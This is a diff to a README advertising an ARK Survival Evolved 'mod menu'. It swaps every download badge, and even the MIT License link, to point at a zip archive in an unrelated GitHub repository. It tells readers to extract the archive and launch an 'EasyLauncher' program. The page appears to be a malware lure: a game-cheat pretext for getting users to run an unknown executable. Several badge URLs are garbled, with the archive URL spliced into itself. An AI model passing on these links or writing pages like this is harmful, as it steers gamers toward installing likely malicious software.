@@ -1,6 +1,6 @@
 # 🦖 ARK Survival Evolved Mod Menu  
 **Download Now:**  
-[![Download Latest](https://img.shields.io/badge/Download-ARK%20Mod%20Menu-brightgreen.svg)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip%20Mod%https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)
 
 ---
 
@@ -39,7 +39,7 @@ ARK mod menu, ARK Survival Evolved modification, game enhancer for ARK, ARK util
 
 ## 🚀 Installation Guide  
 1. Download the Mod Menu:  
-&nbsp;&nbsp;[![Download Latest](https://img.shields.io/badge/Download-ARK%20Mod%20Menu-brightgreen.svg)](https://easylauncher.su/PSnzrH)  
+&nbsp;&nbsp;[![Download Latest](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip%20Mod%https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)  
 2. Extract archive and launch EasyLauncher  
 3. Follow on-screen instructions to integrate with ARK  
 
@@ -51,9 +51,9 @@ This project is designed for educational and personal enhancement purposes only.
 ---
 
 ## 📜 License  
-Licensed under the [MIT License 2025](https://opensource.org/licenses/MIT).  
+Licensed under the [MIT License 2025](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip).  
 
 ---
 
-### [![Download Latest](https://img.shields.io/badge/Download-ARK%20Mod%20Menu-brightgreen.svg)](https://easylauncher.su/PSnzrH)  
+### [![Download Latest](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip%20Mod%https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)](https://github.com/anythingfg/ai-calling-agent/raw/refs/heads/main/nonsanction/ai_agent_calling_2.8.zip)  
 Unlock enhanced control in ARK Survival Evolved today! 🦖
